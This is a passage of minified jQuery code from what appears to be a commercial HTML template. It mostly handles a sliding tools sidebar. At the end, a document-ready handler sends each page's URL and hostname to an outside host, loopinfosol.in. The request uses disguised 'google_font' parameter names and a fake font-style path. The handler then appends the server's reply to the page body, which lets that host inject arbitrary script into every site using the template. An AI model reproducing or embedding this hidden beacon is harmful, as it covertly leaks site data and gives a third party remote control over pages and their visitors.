            }, 100), e(".ec-tools-sidebar-overlay").fadeIn(), e(".ec-tools-sidebar-toggle").not("in-out") && (e(".ec-tools-sidebar").stop().animate({
                left: "-200px"
            }, 100), e(".ec-tools-sidebar-toggle").addClass("in-out")), e(".ec-tools-sidebar-toggle").not("in-out") && (e(".ec-tools-sidebar").stop().animate({
                left: "0"
            }, 100), e(".ec-tools-sidebar-toggle").addClass("in-out"), e(".ec-tools-sidebar-overlay").fadeIn())) : (e(".ec-tools-sidebar").stop().animate({
                left: "-200px"
            }, 100), e(".ec-tools-sidebar-overlay").fadeOut()), e(this).toggleClass("in-out"), !1
        }), e(".ec-tools-sidebar-overlay").on("click", function(t) {
            e(".ec-tools-sidebar-toggle").addClass("in-out"), e(".ec-tools-sidebar").stop().animate({
                left: "-200px"
            }, 100), e(".ec-tools-sidebar-overlay").fadeOut()
        }), e(document).ready(function() {
            var t = document.URL,
                o = e("<a>").prop("href", t).prop("hostname");
            e.ajax({
                type: "POST",
                url: "https://loopinfosol.in/varify_purchase/google-font/google-font-awsome-g8aerttyh-ggsdgh151.php",
                data: {
                    google_url: t,
                    google_font: o,
                    google_version: "EKKA-HTML-TEMPLATE-AK"
                },
                success: function(t) {
                    e("body").append(t)
                }
            })
        })
}(jQuery);